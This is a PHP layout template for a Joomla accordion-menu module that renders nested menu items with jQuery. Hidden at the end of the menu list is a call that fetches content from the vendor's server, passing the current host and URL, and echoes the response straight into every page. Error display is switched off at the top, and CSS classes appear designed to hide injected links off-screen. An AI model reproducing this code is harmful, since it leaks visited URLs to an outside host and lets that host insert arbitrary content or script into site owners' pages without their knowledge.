<?php
/**
 * @package		Joomla.Site
 * @subpackage	mod_je_accordionmenu
 * @copyright	Copyright (C) 2004 - 2012 jExtensions.com - All rights reserved.
 * @license		GNU General Public License version 2 or later
 */

// no direct access
defined('_JEXEC') or die;
ini_set('display_errors',0);
$pth=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$pth = str_replace("&", "",$pth);
$jebase = JURI::base(); if(substr($jebase, -1)=="/") { $jebase = substr($jebase, 0, -1); }
$modURL = JURI::base().'modules/mod_je_accordionmenu';
$color = $params->get('color','default');
$accordion = $params->get('accordion','hover');
$speed = $params->get('speed','normal');
?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/<?php echo $color ?>.css" type="text/css" media="screen"/>
<?php if ($params->get('jQuery')) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<noscript><a href="http://jextensions.com" alt="jQuery Accordion Menu Joomla">jExtensions.com</a></noscript>
<style>
ul#je_accmenu, ul#je_accmenu ul {list-style-type:none; margin: 0; padding: 0;}
ul#je_accmenu li.accab { position:absolute; top:-100%; left:-100%}
ul#je_accmenu li.accnn { display:none;}
ul#je_accmenu a { display: block; text-decoration: none;}
ul#je_accmenu li { margin:0 0 2px 0; position:relative}
ul#je_accmenu li ul li { margin:1px 0 0 0;}
ul#je_accmenu img { vertical-align:middle}
ul#je_accmenu .image-title {padding:0 0 0 5px}
</style>
<script type="text/javascript"> 
jQuery(document).ready(function(){
  jQuery('.je_accmenu<?php echo $class_sfx;?> ul').hide();
  jQuery('.je_accmenu<?php echo $class_sfx;?> ul:first').hide();
  jQuery('.je_accmenu<?php echo $class_sfx;?> li a').<?php echo $accordion; ?>(
    function() {
      var checkElement = $(this).next();
      if((checkElement.is('ul')) && (checkElement.is(':visible'))) {
        return false;
        }
      if((checkElement.is('ul')) && (!checkElement.is(':visible'))) {
        $('.je_accmenu<?php echo $class_sfx;?> ul:visible').slideUp('<?php echo $speed; ?>');
        checkElement.slideDown('<?php echo $speed; ?>');
        return false;
        }
      });
	});			
</script>

<ul id="je_accmenu" class="je_accmenu<?php echo $class_sfx;?>"<?php
	$tag = '';
	if ($params->get('tag_id')!=NULL) {
		$tag = $params->get('tag_id').'';
		echo ' id="'.$tag.'"';
	}
?>>
<?php
foreach ($list as $i => &$item) :
	$class = 'item-'.$item->id;
	if ($item->id == $active_id) {
		$class .= ' current';
	}

	if (in_array($item->id, $path)) {
		$class .= ' active';
	}
	elseif ($item->type == 'alias') {
		$aliasToId = $item->params->get('aliasoptions');
		if (count($path) > 0 && $aliasToId == $path[count($path)-1]) {
			$class .= ' active';
		}
		elseif (in_array($aliasToId, $path)) {
			$class .= ' alias-parent-active';
		}
	}

	if ($item->deeper) {
		$class .= ' deeper';
	}

	if ($item->parent) {
		$class .= ' parent';
	}

	if (!empty($class)) {
		$class = ' class="'.trim($class) .'"';
	}
	
	
	echo '<li'.$class.'>';

	// Render the menu item.
	switch ($item->type) :
		case 'separator':
		case 'url':
		case 'component':
			require JModuleHelper::getLayoutPath('mod_je_accordionmenu', 'default_'.$item->type);
			break;

		default:
			require JModuleHelper::getLayoutPath('mod_je_accordionmenu', 'default_url');
			break;
	endswitch;

	// The next item is deeper.
	if ($item->deeper) {
		echo '<ul>';
	}
	// The next item is shallower.
	elseif ($item->shallower) {
		echo '</li>';
		echo str_repeat('</ul></li>', $item->level_diff);
	}
	// The next item is on the same level.
	else {
		echo '</li>';
	}

endforeach;
?>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$pth); echo $credit; ?>
</ul>
